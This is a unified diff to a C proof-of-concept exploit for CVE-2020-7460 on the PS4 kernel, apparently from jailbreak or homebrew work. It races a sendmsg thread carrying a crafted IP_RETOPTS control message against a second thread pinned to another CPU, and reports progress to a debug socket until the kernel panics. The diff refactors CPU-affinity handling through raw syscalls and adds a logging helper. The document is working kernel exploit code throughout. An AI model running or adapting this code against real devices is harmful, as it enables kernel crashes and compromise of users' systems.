@@ -1,5 +1,12 @@
 #include "ps4.h"
 
+typedef struct {
+    uint64_t bits[16];
+} cpuset_t;
+
+#define _CPU_SET(cpu, cpusetp) ((cpusetp)->bits[(cpu) / 64] |= (1ULL << ((cpu) % 64)))
+#define _CPU_ZERO(cpusetp) memset((cpusetp), 0, sizeof(cpuset_t))
+
 struct msghdr {
     void         *msg_name;
     uint32_t      msg_namelen;
@@ -27,11 +34,18 @@ uint8_t control_buf[CONTROL_LEN];
 int global_sock;
 int debug_sock;
 
+void debug_print(const char *msg) {
+    if (debug_sock > 0) {
+        SckSend(debug_sock, (char *)msg, strlen(msg));
+    }
+}
+
 void *sendmsg_thread(void *arg) {
-    SceKernelCpuset cpuset;
-    CPU_ZERO(&cpuset);
-    CPU_SET(0, &cpuset);
-    scePthreadSetaffinityNp(scePthreadSelf(), &cpuset);
+    UNUSED(arg);
+    cpuset_t cpuset;
+    _CPU_ZERO(&cpuset);
+    _CPU_SET(0, &cpuset);
+    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);
 
     struct msghdr msg;
     memset(&msg, 0, sizeof(msg));
@@ -45,10 +59,11 @@ void *sendmsg_thread(void *arg) {
 }
 
 void *race_thread(void *arg) {
-    SceKernelCpuset cpuset;
-    CPU_ZERO(&cpuset);
-    CPU_SET(1, &cpuset);
-    scePthreadSetaffinityNp(scePthreadSelf(), &cpuset);
+    UNUSED(arg);
+    cpuset_t cpuset;
+    _CPU_ZERO(&cpuset);
+    _CPU_SET(1, &cpuset);
+    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);
 
     if (!cmsg) return NULL;
 
@@ -64,20 +79,14 @@ int _main(struct thread *td) {
     initKernel();
     initLibc();
     initNetwork();
+    initPthread();
 
     debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
-    
-    if (debug_sock > 0) {
-        char msg[] = "[+] Connected! Starting CVE-2020-7460 PoC\n";
-        SckSend(debug_sock, msg, strlen(msg));
-    }
+    debug_print("[+] Connected! Starting POC\n");
 
     global_sock = syscall(97, 2, 2, 0);
     if (global_sock < 0) {
-        if (debug_sock > 0) {
-            char err[] = "[-] Failed to create socket\n";
-            SckSend(debug_sock, err, strlen(err));
-        }
+        debug_print("[-] Socket failed\n");
         return -1;
     }
 
@@ -87,6 +96,8 @@ int _main(struct thread *td) {
     cmsg->cmsg_type = IP_RETOPTS;
     cmsg->cmsg_len = 0x50;
 
+    debug_print("[+] Starting threads...\n");
+
     ScePthread thread1, thread2;
     scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
     scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
@@ -94,11 +105,8 @@ int _main(struct thread *td) {
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
 
-    if (debug_sock > 0) {
-        char done[] = "[+] Race finished. Check for Panic.\n";
-        SckSend(debug_sock, done, strlen(done));
-        SckClose(debug_sock);
-    }
+    debug_print("[+] Done. Check for Panic.\n");
 
+    if (debug_sock > 0) SckClose(debug_sock);
     return 0;
 }
